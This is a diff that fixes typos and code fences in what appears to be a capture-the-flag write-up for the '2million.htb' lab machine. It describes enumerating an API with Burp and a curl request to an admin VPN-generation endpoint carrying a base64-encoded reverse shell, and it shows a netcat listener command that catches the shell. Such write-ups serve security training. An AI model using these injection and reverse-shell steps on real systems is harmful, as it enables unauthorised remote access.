@@ -96,13 +96,13 @@ Between the functional features, actions seems to be the most interesting one.
 
 ![alt text](./img/acces.png)
 
-The acces feature comprehends of a connection pack generator qhich can be regenerated. Each time we press each button, a '.ovpn' gets downloaded.
+The acces feature comprehends of a connection pack generator which can be regenerated. Each time we press each button, a '.ovpn' gets downloaded.
 
 Lets see what kind of curl does the button on the background.
 
 ![alt text](./img/burp.png)
 
-It can bee seen that the button sens a request to the api so it sends the vpn file. 
+It can bee seen that the button sends a request to the api so it sends the vpn file. 
 
 Seeing that there is an accesible api behind(as we proved before whith the acces-code) we could try to procede with an <strong>api enumeration</strong>.
 
@@ -203,9 +203,9 @@ curl -sv -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHP
 ```
 >Here we are using an base64 encoded revershell(its usually better this way)
 
-´´´
+```
 nc -lvnp 443 
-´´´
+```
 And we are in
 
 ## Lateral Movement
